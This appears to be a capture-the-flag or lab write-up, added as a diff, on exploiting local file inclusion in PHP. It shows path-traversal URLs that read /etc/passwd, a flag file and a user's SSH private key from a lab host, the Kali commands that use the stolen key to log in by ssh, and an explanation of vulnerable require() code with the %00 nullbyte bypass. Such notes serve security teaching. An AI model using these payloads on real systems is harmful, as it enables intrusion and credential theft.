@@ -1,0 +1,37 @@
+1. we call /etc/passwd using lfi
+We see banana_user
+3.144.8.66/tasks/LFI/easy-lfi.php?page=../../../../../var/www/html/tasks/LFI/flag.txt
+3.144.8.66/tasks/LFI/easy-lfi.php?page=../../../../../home/banana_user/.ssh/id_rsa
+
+Get keyfile
+
+┌──(kali㉿kali)-[~/adproject]
+└─$ nano id_rsa          
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/adproject]
+└─$ chmod 400 id_rsa   
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/adproject]
+└─$ ssh -i id_rsa banana_user@3.144.8.66
+
+Get login. 
+
+We could also get a shell from calling a PHP file if we found a way to upload files.
+
+
+
+//extra
+The code we are abusing in LFI usually looks like this
+
+$file = $_GET['page'];
+require($file);
+
+Sometimes, however, the code might look like this
+
+$file = $_GET['page'];
+require($file . ".php");
+
+The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the .php will not be taken into account. So we add %00 to the end of our attack-string.
+
+http://example.com/page=../../../../../../etc/passwd%00
+This technique is usually called the nullbyte technique since %00 is the nullbyte. The technique only works in versions below php 5.3. 
